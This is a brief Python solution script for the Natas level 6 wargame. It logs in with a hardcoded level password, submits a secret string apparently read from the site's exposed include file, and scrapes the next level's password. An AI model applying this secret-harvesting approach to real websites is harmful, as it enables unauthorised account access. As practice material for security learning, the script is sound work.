#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/' % username

# response = requests.get(url + "includes/secret.inc", auth=(username, password))
response = requests.post(url,
                         data={"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"},  auth=(username, password))
content = response.text

# print(content)
print(re.findall('The password for natas7 is(.*)', content))
